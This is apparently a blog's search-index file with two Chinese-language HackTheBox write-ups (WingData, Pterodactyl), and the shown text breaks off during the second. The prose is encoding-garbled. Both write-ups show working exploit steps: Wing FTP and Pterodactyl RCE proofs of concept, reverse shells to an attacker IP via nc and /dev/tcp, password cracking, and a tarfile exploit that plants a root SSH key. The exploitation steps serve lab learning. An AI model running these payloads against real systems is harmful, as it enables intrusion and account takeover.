<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HTB-WingData</title>
      <link href="/2026/02/16/HTB-WingData/"/>
      <url>/2026/02/16/HTB-WingData/</url>
      
        <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/WingData]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> nmap -p- --min-rate 5000 -oA nmapscans/ports 10.129.239.109</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.239.109</span><br><span class="line">Host is up (0.099s latency).</span><br><span class="line">Not shown: 65533 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>åªæœ‰ä¸¤ä¸ªç«¯å£</p><h2 id="CVE-2025-47812"><a href="#CVE-2025-47812" class="headerlink" title="CVE-2025-47812"></a>CVE-2025-47812</h2><p>æŸ¥çœ‹webåº”ç”¨ï¼Œåœ¨é¦–é¡µå¯ä»¥è·³è½¬åˆ°<code>ftp.wingdata.htb</code>ï¼Œå‘ç°æ˜¯Wing FTP Serverï¼Œç‰ˆæœ¬ä¸º<code>v7.4.3</code>ã€‚Googleæœç´¢ç›¸å…³æ¼æ´ï¼Œè¯¥æœåŠ¡å™¨å­˜åœ¨CVE-2025-47812ï¼ˆæ¼æ´ç‰ˆæœ¬ï¼šversion&lt;7.4.4ï¼‰æœªæˆæƒRCEã€‚å¯ä»¥åœ¨githubä¸Šæœç´¢ç›¸å…³çš„expåˆ©ç”¨ï¼ˆ<a href="https://github.com/4m3rr0r/CVE-2025-47812-poc%EF%BC%89">https://github.com/4m3rr0r/CVE-2025-47812-pocï¼‰</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/WingData/CVE-2025-47812-poc]</span><br><span class="line">â””â”€$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb/ -c <span class="string">&quot;id&quot;</span>         </span><br><span class="line"></span><br><span class="line">[*] Testing target: http://ftp.wingdata.htb/</span><br><span class="line">[+] Sending POST request to http://ftp.wingdata.htb//loginok.html with <span class="built_in">command</span>: <span class="string">&#x27;id&#x27;</span> and username: <span class="string">&#x27;anonymous&#x27;</span></span><br><span class="line">[+] UID extracted: c9495b9aea10e5a08fb75c2d5de4aabbf528764d624db129b32c21fbca0cb8d6</span><br><span class="line">[+] Sending GET request to http://ftp.wingdata.htb//dir.html with UID: c9495b9aea10e5a08fb75c2d5de4aabbf528764d624db129b32c21fbca0cb8d6</span><br><span class="line"></span><br><span class="line">--- Command Output ---                                                                                                                                                                          </span><br><span class="line">uid=1000(wingftp) gid=1000(wingftp) <span class="built_in">groups</span>=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(<span class="built_in">users</span>),106(netdev)</span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œäº†<code>id</code>å‘½ä»¤ï¼Œæ„é€ payloadè¿›è¡Œåå¼¹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.16.9 4444 -e /bin/sh</span><br></pre></td></tr></table></figure><p>é¶æœºä¸Šæœ‰pythonç¯å¢ƒï¼Œå¯ä»¥æå‡ä¸€ä¸‹shellçš„äº¤äº’æ€§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.9] from (UNKNOWN) [10.129.96.80] 57328</span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">wingftp@wingdata:/opt/wftpserver$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(wingftp) gid=1000(wingftp) <span class="built_in">groups</span>=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(<span class="built_in">users</span>),106(netdev)</span><br></pre></td></tr></table></figure><p>å¼¹åˆ°çš„shellæ˜¯wingftpç”¨æˆ·ï¼ŒæŸ¥çœ‹<code>/etc/passwd</code>å¯ä»¥å‘ç°å­˜åœ¨wackyç”¨æˆ·ã€‚å…ˆåœ¨é¶æœºä¸Šæ”¶é›†ä¿¡æ¯ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wingftp@wingdata:/opt/wftpserver/Data/1/users$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 28</span><br><span class="line">drwxr-x--- 2 wingftp wingftp 4096 Feb 15 22:00 .</span><br><span class="line">drwxr-x--- 4 wingftp wingftp 4096 Feb  9 08:19 ..</span><br><span class="line">-rwxr-x--- 1 wingftp wingftp 2842 Feb 15 22:00 anonymous.xml</span><br><span class="line">-rwxr-x--- 1 wingftp wingftp 2846 Nov  2 11:13 john.xml</span><br><span class="line">-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2 12:05 maria.xml</span><br><span class="line">-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2 12:02 steve.xml</span><br><span class="line">-rw-rw-rw- 1 wingftp wingftp 2856 Nov  2 12:28 wacky.xml</span><br></pre></td></tr></table></figure><p>åœ¨<code>Data/1/users</code>ç›®å½•ä¸‹æœ‰å¾ˆå¤šç”¨æˆ·çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­æœ‰ç”¨æˆ·çš„hashï¼Œå…¨éƒ½ä¿å­˜ä¸‹æ¥å‡†å¤‡çˆ†ç ´å¯†ç ã€‚æŸ¥çœ‹wftpserverçš„å®˜æ–¹æ–‡æ¡£ï¼Œä»ä¸­å¾—çŸ¥å¯†ç åŠ å¯†æ–¹å¼ï¼Œä¸”åœ¨è¿›è¡Œsha256çš„æ—¶å€™å¯èƒ½å­˜åœ¨ç›å€¼ã€‚</p><p>åœ¨<code>Data/1</code>ç›®å½•ä¸‹çš„<code>settings.xml</code>æ–‡ä»¶ä¸­å¯ä»¥æ‰¾åˆ°ç›å€¼ç›¸å…³çš„é…ç½®ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EnablePasswordSalting</span>&gt;</span>1<span class="tag">&lt;/<span class="name">EnablePasswordSalting</span>&gt;</span>                                                         </span><br><span class="line"><span class="tag">&lt;<span class="name">SaltingString</span>&gt;</span>WingFTP<span class="tag">&lt;/<span class="name">SaltingString</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨hashcatè¿›è¡Œçˆ†ç ´</p><p>pass.hash</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP</span><br><span class="line">5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca:WingFTP</span><br><span class="line">a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03:WingFTP</span><br><span class="line">c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10:WingFTP</span><br><span class="line">d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca:WingFTP</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/WingData/CVE-2025-47812-poc]</span><br><span class="line">â””â”€$ hashcat -m 1410 -a 0 pass.hash /usr/share/wordlists/rockyou.txt                </span><br><span class="line">32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°å¯†ç å¯ä»¥é€šè¿‡sshç™»é™†åˆ°wackyç”¨æˆ·</p><h2 id="CVE-2025-4517-to-ROOT"><a href="#CVE-2025-4517-to-ROOT" class="headerlink" title="CVE-2025-4517 to ROOT"></a>CVE-2025-4517 to ROOT</h2><p><code>sudo -l</code>æŸ¥çœ‹ç”¨æˆ·å¯ç”¨çš„sudoå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wacky@wingdata:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> wacky on wingdata:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span><br><span class="line"></span><br><span class="line">User wacky may run the following commands on wingdata:</span><br><span class="line">    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *</span><br></pre></td></tr></table></figure><p>å‘ç°wackyå¯ä»¥è¿è¡Œ<code>/opt/backup_clients/restore_backup_clients.py</code>pythonè„šæœ¬ï¼Œä¸‹è½½pythonè„šæœ¬è¿›è¡Œå®¡è®¡ã€‚pythonè„šæœ¬çš„åŠŸèƒ½æ˜¯å°†<code>/opt/backup_clients/backups</code>ç›®å½•ä¸‹çš„taråŒ…è§£å‹åˆ°<code>/opt/backup_clients/restored_backups</code>ç›®å½•ä¸‹ã€‚</p><p><strong>æ¼æ´ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(backup_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">            tar.extractall(path=staging_dir, <span class="built_in">filter</span>=<span class="string">&quot;data&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Extraction completed in <span class="subst">&#123;staging_dir&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> (tarfile.TarError, OSError, Exception) <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Error during extraction: <span class="subst">&#123;e&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå­˜åœ¨CVE-2025-4517æ¼æ´ï¼Œå³<code>tarfile.extractall()æˆ–tarFile.extract()</code>åœ¨é…ç½®<code>filter=dataæˆ–filter=tar</code>æ—¶ï¼Œå¯ä»¥åˆ©ç”¨RealPathæº¢å‡ºç»•è¿‡filterçš„é™åˆ¶å°†tarè§£å‹åˆ°å…¶ä»–æ–‡ä»¶ä¸­ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å°†è‡ªå·±çš„å…¬é’¥å†™å…¥åˆ°<code>/root/.ssh/authorized_keys</code>ä¸­ï¼Œç„¶åé€šè¿‡sshç™»é™†åˆ°rootç”¨æˆ·ã€‚åœ¨githubä¸Šæœç´¢expç”Ÿæˆæ¶æ„çš„taråŒ…ï¼ˆ<a href="https://github.com/DesertDemons/CVE-2025-4138-4517-POC%EF%BC%89">https://github.com/DesertDemons/CVE-2025-4138-4517-POCï¼‰</a></p><p><strong>0x01 ç”Ÿæˆsshå¯†é’¥å¯¹</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -f id_ed25519 -N <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>ä¼šç”Ÿæˆ<code>id_ed25519.pub</code>å’Œ<code>id_ed25519</code>å…¬é’¥å’Œç§é’¥æ–‡ä»¶</p><p><strong>0x02 ç”ŸæˆtaråŒ…</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py --tar-out backup_1002.tar --target /root/.ssh/authorized_keys --payload id_ed25519.pub --mode 0600</span><br></pre></td></tr></table></figure><p><strong>0x03 ä¸Šä¼ è‡³é¶æœºåˆ©ç”¨</strong></p><p>å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼ä¸Šä¼ è‡³é¶æœºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wacky@wingdata:/opt/backup_clients/backups$ <span class="built_in">sudo</span> /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1002.tar -r restore_pwn</span><br><span class="line">[+] Backup: backup_1002.tar</span><br><span class="line">[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn</span><br><span class="line">[+] Extraction completed <span class="keyword">in</span> /opt/backup_clients/restored_backups/restore_pwn</span><br></pre></td></tr></table></figure><p><strong>0x04 sshç™»å½•</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_ed25519 root@wingdata.htb</span><br><span class="line">root@wingdata:~# <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sudo </tag>
            
            <tag> Linux </tag>
            
            <tag> CVE-2025-47812 </tag>
            
            <tag> SHA256 </tag>
            
            <tag> CVE-2025-4517 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Pterodactyl</title>
      <link href="/2026/02/14/HTB-Pterodactyl/"/>
      <url>/2026/02/14/HTB-Pterodactyl/</url>
      
        <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.23.53</span><br><span class="line">Host is up (0.88s latency).</span><br><span class="line">Not shown: 65496 filtered tcp ports (no-response), 35 filtered tcp ports (admin-prohibited)</span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">22/tcp   open   ssh</span><br><span class="line">80/tcp   open   http</span><br><span class="line">443/tcp  closed https</span><br><span class="line">8080/tcp closed http-proxy</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹80ç«¯å£ï¼ŒæŸ¥çœ‹changelog.txt</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[Installed] Pterodactyl Panel v1.11.10</span><br><span class="line">--------------------------------------</span><br><span class="line">- Installed Pterodactyl Panel.</span><br><span class="line">- Configured environment:</span><br><span class="line">  - PHP with required extensions.</span><br><span class="line">  - MariaDB 11.8.3 backend.</span><br><span class="line">  </span><br><span class="line">[Enhanced] PHP Capabilities</span><br><span class="line">-------------------------------------</span><br><span class="line">- Enabled PHP-FPM for smoother website handling on all domains.</span><br><span class="line">- Enabled PHP-PEAR for PHP package management.</span><br><span class="line">- Added temporary PHP debugging via phpinfo()</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¯¥é¶æœºå®‰è£…äº†Pterodactylé¢æ¿ç‰ˆæœ¬å·ä¸º<code>v1.11.10</code>ä¸”å®‰è£…äº†<code>PHP-PEAR</code>ï¼Œä»¥åŠå­˜åœ¨ä¸€ä¸ªphpinfo.phpé¡µé¢ã€‚</p><h2 id="Subdomain"><a href="#Subdomain" class="headerlink" title="Subdomain"></a>Subdomain</h2><p>ä½¿ç”¨ffufå·¥å…·è¿›è¡Œå­åŸŸåæ”¶é›†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/Pterodactyl]</span><br><span class="line">â””â”€$ ffuf -u http://pterodactyl.htb -H <span class="string">&quot;Host: FUZZ.pterodactyl.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -ac</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://pterodactyl.htb</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.pterodactyl.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : true</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 621ms]</span></span><br></pre></td></tr></table></figure><p>æ‰«å‡ºæ¥ä¸€ä¸ªpanel.pterodactyl.htbï¼Œè®¿é—®åæ˜¯ç¿¼é¾™é¢æ¿çš„ç™»å½•é¡µé¢ã€‚</p><h2 id="CVE-2025-49132"><a href="#CVE-2025-49132" class="headerlink" title="CVE-2025-49132"></a>CVE-2025-49132</h2><p>åœ¨Googleä¸Šæœç´¢pterodactylçš„CVEï¼Œæ‰¾åˆ°CVE-2025-49132 RCEæ¼æ´ï¼ˆæ¼æ´ç‰ˆæœ¬ï¼šversion &lt; 1.11.1ï¼‰æ–‡ä»¶åŒ…å«æœ¬åœ°çš„pearcmd.phpä»è€Œå‘½ä»¤æ‰§è¡Œã€‚ä¸‹è½½expï¼ˆ<a href="https://github.com/0xtensho/CVE-2025-49132-poc%EF%BC%89">https://github.com/0xtensho/CVE-2025-49132-pocï¼‰</a><br>é€šè¿‡phpinfo.phpå¯ä»¥å¾—åˆ°pearcmd.phpåœ¨æœåŠ¡å™¨ä¸Šçš„ä½ç½®ï¼Œå¹¶æ›¿æ¢expä¸­çš„è·¯å¾„</p><p><img src="image-20260216152134122.png" alt="image-20260216152134122"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"></span><br><span class="line">host=sys.argv[<span class="number">1</span>]</span><br><span class="line">payload=sys.argv[<span class="number">2</span>].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\\$\\\\&#123;IFS\\\\&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ugly but have to use curl since the package requests won&#x27;t allow us to send characters like &#x27;&#123;&#x27; without encoding them</span></span><br><span class="line">os.system(<span class="string">f&quot;curl \&quot;http://<span class="subst">&#123;host&#125;</span>/locales/locale.json?+config-create+/&amp;locale=../../../../../usr/share/php/PEAR&amp;namespace=pearcmd&amp;/&lt;?=system(&#x27;<span class="subst">&#123;payload&#125;</span>&#x27;);die();?&gt;+/tmp/payload.php\&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">f&quot;curl \&quot;http://<span class="subst">&#123;host&#125;</span>/locales/locale.json?locale=../../../../../tmp&amp;namespace=payload\&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨è„šæœ¬è¿›è¡Œåå¼¹shellï¼Œåˆ©ç”¨è¯¥è„šæœ¬åå¼¹shellçš„æ—¶å€™éœ€è¦æ³¨æ„base64å­—ç¬¦ä¸²ä¸­ä¸èƒ½å‡ºç°<code>+</code>å·ï¼Œå¯ä»¥åœ¨payloadé‡ŒåŠ ä¸Šé€‚é‡çš„ç©ºæ ¼ç›´åˆ°base64encodeåçš„å­—ç¬¦ä¸²ä¸­ä¸å­˜åœ¨<code>+</code>å·ã€‚<img src="image-20260216153511903.png" alt="image-20260216153511903"></p><p>ç›‘å¬æœ¬åœ°4444ç«¯å£ï¼Œæ‰§è¡Œåå¼¹shellè„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/Pterodactyl/CVE-2025-49132-poc]</span><br><span class="line">â””â”€$ python3 poc.py panel.pterodactyl.htb <span class="string">&quot;echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOTAvNDQ0NCAwPiYx | base64 -d|bash&quot;</span> </span><br></pre></td></tr></table></figure><h2 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h2><p>é¶æœºç¯å¢ƒä¸­æœ‰pythonï¼Œå…ˆæå‡ä¸€ä¸‹shellçš„äº¤äº’æ€§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹<code>/etc/passwd</code>æ–‡ä»¶ï¼Œæ‰¾åˆ°ä¸¤ä¸ªå¯ç™»å½•çš„ç”¨æˆ·</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headmonitor:x:1001:100::/home/headmonitor:/bin/bash</span><br><span class="line">phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash</span><br></pre></td></tr></table></figure><p>åœ¨ç¯å¢ƒå˜é‡ä¸­å¯ä»¥æ‰¾åˆ°MariaDBæ•°æ®åº“çš„ç›¸å…³ä¿¡æ¯</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DB_PASSWORD=PteraPanel</span><br><span class="line">DB_USERNAME=pterodactyl</span><br><span class="line">DB_CONNECTION=mysql</span><br><span class="line">DB_DATABASE=panel</span><br></pre></td></tr></table></figure><p>è¿æ¥æ•°æ®åº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -u pterodactyl -pPteraPanel -D panel</span><br></pre></td></tr></table></figure><p>åœ¨<code>users</code>è¡¨ä¸­æœ‰ä¸¤æ¡ç”¨æˆ·æ•°æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [panel]&gt; sselect * from <span class="built_in">users</span>;</span><br><span class="line"><span class="keyword">select</span> * from <span class="built_in">users</span>;</span><br><span class="line">+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+</span><br><span class="line">| <span class="built_in">id</span> | external_id | uuid                                 | username     | email                        | name_first | name_last | password                                                     | remember_token                                               | language | root_admin | use_totp | totp_secret | totp_authenticated_at | gravatar | created_at          | updated_at          |</span><br><span class="line">+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+</span><br><span class="line">|  2 | NULL        | 5e6d956e-7be9-41ec-8016-45e434de8420 | headmonitor  | headmonitor@pterodactyl.htb  | Head       | Monitor   | $2y$10<span class="variable">$3WJht3</span>/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 | OL0dNy1nehBYdx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU | en       |          1 |        0 | NULL        | NULL                  |        1 | 2025-09-16 17:15:41 | 2025-09-16 17:15:41 |</span><br><span class="line">|  3 | NULL        | ac7ba5c2-6fd8-4600-aeb6-f15a3906982b | phileasfogg3 | phileasfogg3@pterodactyl.htb | Phileas    | Fogg      | $2y$10<span class="variable">$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi</span> | 6XGbHcVLLV9fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8 | en       |          0 |        0 | NULL        | NULL                  |        1 | 2025-09-16 19:44:19 | 2025-11-07 18:28:50 |</span><br><span class="line">+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br></pre></td></tr></table></figure><p>å°†ä¸¤ä¸ªç”¨æˆ·çš„hashä¿å­˜ä¸ºpass.hashï¼Œç„¶åä½¿ç”¨johnçˆ†ç ´å¯†ç </p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headmonitor:$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2</span><br><span class="line">phileasfogg3:$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john pass.hash 